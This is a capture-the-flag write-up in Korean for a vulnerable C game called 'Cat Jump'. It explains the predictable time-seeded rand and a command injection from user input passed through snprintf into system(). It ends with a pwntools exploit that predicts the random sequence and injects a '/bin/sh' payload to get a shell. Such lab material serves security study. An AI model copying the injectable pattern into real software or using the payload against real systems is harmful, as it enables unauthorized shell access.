# Cat Jump


```c
/* cat_jump.c
 * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define CAT_JUMP_GOAL 37

#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3

#define OBSTACLE_PROBABILITY 0.5
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

void PrintBanner() {
    puts("                         .-.\n" \
         "                          \\ \\\n" \
         "                           \\ \\\n" \
         "                            | |\n" \
         "                            | |\n" \
         "          /\\---/\\   _,---._ | |\n" \
         "         /^   ^  \\,'       `. ;\n" \
         "        ( O   O   )           ;\n" \
         "         `.=o=__,'            \\\n" \
         "           /         _,--.__   \\\n" \
         "          /  _ )   ,'   `-. `-. \\\n" \
         "         / ,' /  ,'        \\ \\ \\ \\\n" \
         "        / /  / ,'          (,_)(,_)\n" \
         "       (,;  (,,)      jrei\n");
}

char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

void StartGame() {
    char cat_name[32];
    char catnip;
    char cmd[64];
    char input;
    char obstacle;
    double p;
    unsigned char jump_cnt;

    srand(time(NULL));

    catnip = 0;
    jump_cnt = 0;

    puts("let the cat reach the roof! 🐈");

    sleep(1);

    do {
        // set obstacle with a specific probability.
        obstacle = rand() % 2;

        // get input.
        do {
            printf("left jump='h', right jump='j': ");
            scanf("%c%*c", &input);
        } while (input != 'h' && input != 'l');

        // jump.
        if (catnip) {
            catnip--;
            jump_cnt++;
            puts("the cat powered up and is invincible! nothing cannot stop! 🐈");
        } else if ((input == 'h' && obstacle != OBSTACLE_LEFT) ||
                (input == 'l' && obstacle != OBSTACLE_RIGHT)) {
            jump_cnt++;
            puts("the cat jumped successfully! 🐱");
        } else {
            puts("the cat got stuck by obstacle! 😿 🪨 ");
            return;
        }

        // eat some catnip with a specific probability.
        p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            puts("the cat found and ate some catnip! 😽");
            catnip = CATNIP_INVINCIBLE_TIMES;
        }
    } while (jump_cnt < CAT_JUMP_GOAL);

    puts("your cat has reached the roof!\n");

    printf("let people know your cat's name 😼: ");
    scanf("%31s", cat_name);

    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
}

int main(void) {
    Init();
    PrintBanner();
    StartGame();

    return 0;
}
```

## 취약점 분석

### snprintf

`snprintf`는 형식화된 데이터를 문자열로 바꾸는 함수이다. 이를 통해 위 프로그램에서는 사용자가 입력한 값을 출력하고 저장소에 저장하기 위해 사용했다.

즉, 위 함수에서 사용자의 입력을 이용해서 system를 실행하게 된다. 

사용자의 입력을 system함수에서 실행한다는 것을 이용해서 커맨드 인잭션 공격을 시도해 볼 수 있을 것이다.

### srand, rand

랜덤한 값을 위해 srand와 rand함수를 사용하였는데, srand의 시드 값을 현재 시간으로 설정했기 때문에 같은 시간을 설정해주면 랜덤값을 알아낼 수 있을 것이다.

## 익스플로잇 구상

`ctypes`를 이용하면 파이썬에서 C 언어로 작성된 공유 라이브러리(.dll, .so, .dylib)를 불러와 함수를 직접 호출할 수 있게 해주는 파이썬 내장 외부 함수(Foreign Function Interface) 라이브러리이다. 

즉, 이를 통해 c언어에 존재하는 srand와 rand함수를 이용할 수 있다.

## 익스플로잇 코드

```python
from pwn import *
import sys
import ctypes

if len(sys.argv) == 3:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process('./cat_jump')

libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')

now = libc.time(0x00)
libc.srand(now)

p.recvuntil(b"let the cat reach the roof! ")

for i in range(37):
    rand = libc.rand() % 2

    if (rand == 0):
        p.sendlineafter(b"left jump='h', right jump='j': ", b'l')

    else:
        p.sendlineafter(b"left jump='h', right jump='j': ", b'h')

    libc.rand()

p.sendlineafter(b":", b"a\";/bin/sh;\"")
p.interactive()
```